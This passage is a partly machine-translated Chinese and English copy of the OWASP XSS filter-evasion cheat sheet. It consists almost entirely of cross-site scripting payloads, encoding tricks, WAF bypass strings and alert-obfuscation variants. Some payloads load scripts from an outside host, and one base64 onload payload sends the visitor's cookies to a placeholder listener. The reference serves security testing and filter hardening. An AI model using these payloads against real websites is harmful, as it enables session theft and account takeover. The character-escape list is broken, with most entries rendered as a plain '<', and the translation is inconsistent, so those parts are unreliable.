### 使用背景图像的样式标记[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tag-using-background-image)

```
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

### 使用背景的样式标记[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tag-using-background)

```
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>` `<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

### 具有 STYLE 属性的匿名 HTML[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#anonymous-html-with-style-attribute)

IE 渲染引擎模式下的 IE6.0 和 Netscape 8.1+ 并不真正关心您构建的 HTML 标签是否存在，只要它以左尖括号和字母开头：

```
<XSS STYLE="xss:expression(alert('XSS'))">
```

### 本地HTC文件[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#local-htc-file)

这与上述两个跨站点脚本向量略有不同，因为它使用 .htc 文件，该文件必须与 XSS 向量位于同一服务器上。示例文件通过拉入 JavaScript 并将其作为样式属性的一部分运行：

```
<XSS STYLE="behavior: url(xss.htc);">
```

### US-ASCII 编码[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#us-ascii-encoding)

US-ASCII 编码（由 Kurt Huwig 发现）。它使用 7 位而不是 8 位的格式错误的 ASCII 编码。此 XSS 可能会绕过许多内容过滤器，但仅在主机以 US-ASCII 编码传输或您自己设置编码时才有效. 这对于 Web 应用程序防火墙跨站点脚本规避比服务器端过滤器规避更有用。Apache Tomcat 是唯一已知的以 US-ASCII 编码传输的服务器。

```
¼script¾alert(¢XSS¢)¼/script¾
```

### 元[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#meta)

元刷新的奇怪之处在于它不会在标头中发送引荐来源网址 - 因此它可以用于某些类型的攻击，您需要摆脱引荐网址：

```
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

#### META 使用数据[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#meta-using-data)

指令 URL 方案。这很好，因为它也没有任何明显的包含单词 SCRIPT 或 JavaScript 指令的东西，因为它使用 base64 编码。请参阅 RFC 2397 了解更多详情，或前往此处或此处自行编码。如果您只想对原始 HTML 或 JavaScript 进行编码，也可以使用下面的 XSS[计算器，因为它具有 Base64 编码方法：](http://ha.ckers.org/xsscalc.html)

```
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

#### 带有附加 URL 参数的 META[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#meta-with-additional-url-parameter)

如果目标网站试图查看 URL 是否`<http://>;`在开头包含，您可以使用以下技术（由 Moritz Naumann 提交）避开它：

```
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```

### 框架[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#iframe)

如果允许 iframe，还有很多其他 XSS 问题：

```
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```

### 基于 IFRAME 事件[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#iframe-event-based)

IFrame 和大多数其他元素可以使用基于事件的混乱，如下所示......（提交者：David Cross）

```
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```

### 框架[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#frame)

Frames have the same sorts of XSS problems as iframes

```
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```

### TABLE[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#table)

```
<TABLE BACKGROUND="javascript:alert('XSS')">
```

#### TD[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#td)

Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:

```
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

### DIV[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div)

#### DIV Background-image[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div-background-image)

```
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV Background-image with Unicoded XSS Exploit[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div-background-image-with-unicoded-xss-exploit)

This has been modified slightly to obfuscate the URL parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:

```
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```

#### DIV Background-image Plus Extra Characters[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div-background-image-plus-extra-characters)

Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

```
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV Expression[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div-expression)

这种变体对使用冒号和“表达式”之间的换行符的真实世界跨站点脚本过滤器有效：

```
<DIV STYLE="width: expression(alert('XSS'));">
```

### 下层隐藏块[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#downlevel-hidden-block)

仅适用于 IE5.0 及更高版本和 IE 渲染引擎模式下的 Netscape 8.1）。一些网站认为评论块中的任何内容都是安全的，因此不需要删除，这允许我们的跨站点脚本向量。或者系统可以在某物周围添加评论标签以试图使其无害。正如我们所看到的，这可能无法完成这项工作：

```
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

### 基础标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#base-tag)

在 IE 和 Netscape 8.1 中以安全模式工作。您需要`//`注释掉下一个字符，这样您就不会收到 JavaScript 错误，并且您的 XSS 标记将呈现。`images/image.jpg`此外，这依赖于网站使用动态放置的图像而不是完整路径的事实。如果路径包含一个前导正斜杠，例如`/images/image.jpg`您可以从此向量中删除一个斜杠（只要有两个开始注释，这将起作用）：

```
<BASE HREF="javascript:alert('XSS');//">
```

### 对象标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#object-tag)

如果它们允许对象，您还可以注入病毒负载以感染用户等，与 APPLET 标签相同）。链接文件实际上是一个 HTML 文件，其中可以包含您的 XSS：

```
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```

### 嵌入包含 XSS 的 Flash 电影[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embed-a-flash-movie-that-contains-xss)

点击这里查看演示：~~http://ha.ckers.org/xss.swf~~

```
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
```

如果您添加属性`allowScriptAccess="never"`，`allownetworking="internal"`它可以减轻这种风险（感谢 Jonathan Vanasco 提供的信息）。

### 包含 XSS 向量的 EMBED SVG[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embed-svg-which-contains-xss-vector)

此示例仅适用于 Firefox，但它比 Firefox 中的上述向量更好，因为它不需要用户打开或安装 Flash。感谢 nEUROO 这个。

```
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

### 在 Flash 中使用 ActionScript 进行混淆[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#using-actionscript-inside-flash-for-obfuscation)

```
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")"; 
eval(a+b+c+d);
```

### 带有 CDATA 混淆的 XML 数据岛[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xml-data-island-with-cdata-obfuscation)

此 XSS 攻击仅适用于 IE 和 Netscape 8.1 的 IE 渲染引擎模式）- Sec Consult 在审计 Yahoo 时发现的向量：

```
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> 
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

### 使用 XML 数据岛生成的具有嵌入式 JavaScript 的本地托管 XML[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island)

这与上面相同，但它是指包含您的跨站点脚本向量的本地托管（必须在同一服务器上）XML 文件。你可以在这里看到结果：

```
<XML SRC="xsstest.xml" ID=I></XML>  
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```

### XML 中的 HTML+TIME[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#htmltime-in-xml)

这就是 Gray Magic 入侵 Hotmail 和 Yahoo! 的方式。这仅适用于 IE 渲染引擎模式下的 Internet Explorer 和 Netscape 8.1，请记住，您需要位于 HTML 和 BODY 标记之间才能使其工作：

```
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```

### 假设您只能容纳几个字符，并且它会过滤`.js`[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js)

您可以将 JavaScript 文件重命名为 XSS 向量的图像：

```
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```

### SSI（服务器端包括）[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#ssi-server-side-includes)

这需要在服务器上安装 SSI 才能使用此 XSS 向量。我可能不需要提及这一点，但是如果您可以在服务器上运行命令，那么毫无疑问会出现更严重的问题：

```
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```

### PHP[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#php)

需要在服务器上安装 PHP 才能使用此 XSS 向量。同样，如果您可以像这样远程运行任何脚本，则可能存在更多可怕的问题：

```
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

### IMG 嵌入式命令[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-embedded-commands)

当注入此内容的网页（如网络板）受密码保护并且密码保护与同一域上的其他命令一起使用时，此方法有效。这可用于删除用户、添加用户（如果访问该页面的用户是管理员）、将凭据发送到其他地方等......这是较少使用但更有用的 XSS 向量之一：

```
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```

#### IMG 嵌入式命令第二部分[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-embedded-commands-part-ii)

这更可怕，因为除了它不是托管在您自己的域上之外，绝对没有任何标识符使它看起来可疑。向量使用 302 或 304（其他也可以）将图像重定向回命令。因此，法线`<IMG SRC="httx://badguy.com/a.jpg">`实际上可能是作为查看图像链接的用户运行命令的攻击向量。这是完成向量的 .htaccess （在 Apache 下）行（感谢 Timo 的部分内容）：

```
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```

### Cookie 操作[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#cookie-manipulation)

诚然，这非常晦涩难懂，但我已经看到了一些`<META`允许的示例，您可以使用它来覆盖 cookie。还有其他一些网站示例，其中不是从数据库中获取用户名，而是将用户名存储在 cookie 中，仅显示给访问该页面的用户。结合这两种情况，您可以修改受害者的 cookie，该 cookie 将作为 JavaScript 显示给他们（您也可以使用它来注销人们或更改他们的用户状态，让他们以您的身份登录，等等...）：

```
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

### UTF-7 编码[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#utf-7-encoding)

If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.:

```
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
```

### XSS Using HTML Quote Encapsulation[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-using-html-quote-encapsulation)

This was tested in IE, your mileage may vary. For performing XSS on sites that allow `<SCRIPT>` but don't allow `<SCRIPT SRC...` by way of a regex filter `/\<script\[^\>\]+src/i`:

```
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

For performing XSS on sites that allow `<SCRIPT>` but don't allow `\<script src...` by way of a regex filter `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (this is an important one, because I've seen this regex in the wild):

```
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Another XSS to evade the same filter, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:

```
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Yet another XSS to evade the same filter, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`. I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow `<SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `<SCRIPT>` tags):

```
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

And one last XSS attack to evade, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` using grave accents (again, doesn't work in Firefox):

```
<SCRIPT a=`>`SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:

```
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:

```
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### URL String Evasion[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#url-string-evasion)

Assuming `http://www.google.com/` is programmatically disallowed:

#### IP Versus Hostname[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#ip-versus-hostname)

```
<A HREF="http://66.102.7.147/">XSS</A>
```

#### URL Encoding[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#url-encoding)

```
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

#### DWORD Encoding[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#dword-encoding)

Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:

```
<A HREF="http://1113982867/">XSS</A>
```

#### Hex Encoding[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#hex-encoding)

The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):

```
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```

#### Octal Encoding[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#octal-encoding)

再次填充是允许的，尽管您必须将其保持在每个类 4 个以上的字符总数之上 - 如在 A 类、B 类等中......：

```
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```

#### Base64 编码[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#base64-encoding)

<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">

#### 混合编码[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#mixed-encoding)

让我们混合和匹配基本编码并添加一些制表符和换行符 - 为什么浏览器允许这样做，我永远不会知道）。制表符和换行符仅在使用引号封装时才起作用：

```
<A HREF="h 
tt  p://6   6.000146.0x7.147/">XSS</A>
```

#### 协议解析绕过[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#protocol-resolution-bypass)

`//`转换为`http://`可以节省更多字节。当空间也是一个问题时，这真的很方便（少两个字符可以走很长的路）并且可以轻松绕过正则表达式`(ht|f)tp(s)?://`（感谢 Ozh 提供了这一部分）。您也可以将 更改`//`为`\\\\`。但是，您确实需要保留斜线，否则这将被解释为相对路径 URL。

```
<A HREF="//www.google.com/">XSS</A>
```

#### 谷歌“感觉幸运”第 1 部分[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#google-feeling-lucky-part-1)

Firefox 使用 Google 的“感觉幸运”功能将用户重定向到您输入的任何关键字。因此，如果您的可利用页面是某个随机关键字的顶部（如您在此处看到的），您可以使用该功能对抗任何 Firefox 用户。这使用 Firefox 的`keyword:`协议。例如，您可以使用以下内容连接多个关键字`keyword:XSS+RSnake`。从 2.0 开始，这不再适用于 Firefox。

```
<A HREF="//google">XSS</A>
```

#### 谷歌“感觉幸运”第 2 部分[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#google-feeling-lucky-part-2)

这使用了一个看起来只适用于 Firefox 的小技巧，因为它实现了“感觉幸运”功能。与下一个不同，这在 Opera 中不起作用，因为 Opera 认为这是旧的 HTTP Basic Auth 网络钓鱼攻击，但事实并非如此。这只是一个格式错误的 URL。如果您在对话框上单击“确定”，它将起作用，但是由于错误的对话框，我说 Opera 不支持此功能，并且从 2.0 开始，Firefox 不再支持它：

```
<A HREF="http://ha.ckers.org@google">XSS</A>
```

#### 谷歌“感觉幸运”第 3 部分[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#google-feeling-lucky-part-3)

这使用了一个格式错误的 URL，该 URL 似乎仅在 Firefox 和 Opera 中有效，因为它们实现了“感觉幸运”功能。与上述所有内容一样，它要求您在 Google 中的关键字排名第一（在本例中为“google”）：

```
<A HREF="http://google:ha.ckers.org">XSS</A>
```

#### 删除 CNAME[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#removing-cnames)

与上述 URL 结合使用时，删除`www.`将额外节省 4 个字节，对于正确设置的服务器，总共节省 9 个字节）：

```
<A HREF="http://google.com/">XSS</A>
```

绝对 DNS 的额外点：

```
<A HREF="http://www.google.com./">XSS</A>
```

#### JavaScript 链接位置[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#javascript-link-location)

```
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

#### 内容替换作为攻击向量[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#content-replace-as-attack-vector)

假设`http://www.google.com/`以编程方式被替换为空）。`java&\#x09;script:`实际上，我通过使用转换过滤器本身（这里是一个示例）来帮助创建攻击向量（IE：被转换为`java script:`，在 IE 中呈现，Netscape 8.1+ 在安全站点中），对几个独立的现实世界 XSS 过滤器使用了类似的攻击向量模式和歌剧）：

```
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```

### 协助 XSS 处理 HTTP 参数污染[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#assisting-xss-with-http-parameter-pollution)

假设网站上的内容共享流程实现如下所示。有一个“内容”页面，其中包括用户提供的一些内容，该页面还包括一个“分享”页面的链接，用户可以选择他们最喜欢的社交分享平台进行分享。开发者在“内容”页面中对“标题”参数进行了 HTML 编码以防止 XSS，但由于某些原因，他们没有对该参数进行 URL 编码以防止 HTTP 参数污染。最后他们决定，因为 content_type 的值是一个常量并且总是整数，所以他们没有在“共享”页面中对 content_type 进行编码或验证。

#### 内容页面源代码[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#content-page-source-code)

```
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

#### 分享页面源代码[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#share-page-source-code)

```
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>
```

#### 内容页面输出[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#content-page-output)

在这种情况下，如果攻击者将不受信任的内容标题设置为“This is a regular title&content_type=1;alert(1)”，“内容”页面中的链接将是：

<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>

#### 分享页面输出[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#share-page-output)

在共享页面输出可能是这样的：

```
<script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//some user agreement and sending to server logic might be here
…
</script>
```

因此，在此示例中，主要缺陷是在没有正确编码或验证的情况下信任“共享”页面中的 content_type。HTTP 参数污染可以通过将 XSS 缺陷从反射型 XSS 提升为存储型 XSS 来增加 XSS 缺陷的影响。

## 字符转义序列[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#character-escape-sequences)

HTML 和 JavaScript 中字符“\<”的所有可能组合。其中大多数不会开箱即用，但其中许多可以在某些情况下进行渲染，如上所示。

- `<`
- `%3C`
- `&lt`
- `<`
- `&LT`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `<`
- `\x3c`
- `\x3C`
- `\u003c`
- `\u003C`

## 绕过 WAF 的方法 - 跨站点脚本[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#methods-to-bypass-waf-cross-site-scripting)

### 一般问题[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#general-issues)

#### 存储型 XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#stored-xss)

如果攻击者设法通过过滤器推动 XSS，WAF 将无法阻止攻击传导。

#### JavaScript 中的反射型 XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#reflected-xss-in-javascript)

```
Example: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
Exploitation: /?xss=500); alert(document.cookie);//
```

#### 基于 DOM 的 XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#dom-based-xss)

```
Example: <script> ... eval($\_GET\[xss\]); ... </script>
Exploitation: /?xss=document.cookie
```

#### XSS 通过请求重定向[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-via-request-redirection)

- 易受攻击的代码：

```
...
header('Location: '.$_GET['param']);
...
```

也：

```
..
header('Refresh: 0; URL='.$_GET['param']); 
...
```

- 此请求不会通过 WAF：

```
/?param=<javascript:alert(document.cookie>)
```

- 此请求将通过 WAF，并在某些浏览器中进行 XSS 攻击。

```
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### XSS 的 WAF 绕过字符串[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#waf-bypass-strings-for-xss)

- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `<Video> <source onerror = "javascript: alert (XSS)">`
- `<Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content=" 1  ; JAVASCRIPT: alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data:,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript:alert(document.location)>`
- `<form><a href="javascript:\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome:prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*{x:expression(alert(/xss/))}//<style></style>`
- 鼠标悬停
- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=javascript:alert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript:alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT:confirm(1)"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>`

### 过滤器绕过警报混淆[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#filter-bypass-alert-obfuscation)

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\u0065rt(1)`
- `top[‘al\145rt’](1)`
- `top[‘al\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- ` `${alert``}``（有效载荷应包括前导和尾随反引号。）
- `(alert())`
